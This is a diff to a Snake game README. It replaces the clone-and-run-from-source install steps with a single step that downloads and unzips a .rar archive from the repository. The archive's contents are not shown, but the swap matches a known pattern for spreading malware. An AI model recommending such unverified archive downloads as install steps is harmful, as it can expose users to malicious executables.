@@ -1,6 +1,6 @@
 # 🐍 Uróboros - Snake Game
 
-A modern implementation of the classic Snake game built with Python Turtle Graphics. Control the serpent, collect food, and try to beat your high score!
+Implementation of the classic Snake game built with Python Turtle Graphics. Control the serpent, collect food, and try to beat your high score!
 
 ![Python](https://img.shields.io/badge/Python-3.8%2B-blue?logo=python)
 ![Game](https://img.shields.io/badge/Type-Game-green)
@@ -21,17 +21,9 @@ A modern implementation of the classic Snake game built with Python Turtle Graph
 
 ## 🚀 Installation
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/Juda-Tech-Green/snake-game
-   cd uroboros-snake-game
-    ```   
-2. **Ensure Python is installed**
-- Requires Python 3.8 or higher
-- Download from python.org
-  ```bash
-   python main
-    ```   
+1. **Download and Unzip:** [Uroboros.rar](https://github.com/Juda-Tech-Green/snake-game/raw/main/Uroboros.rar?download=1)
+2. **Enjoy!**
+
 ## How to Play
 
 - Up Arrow 🡹 - Move upward
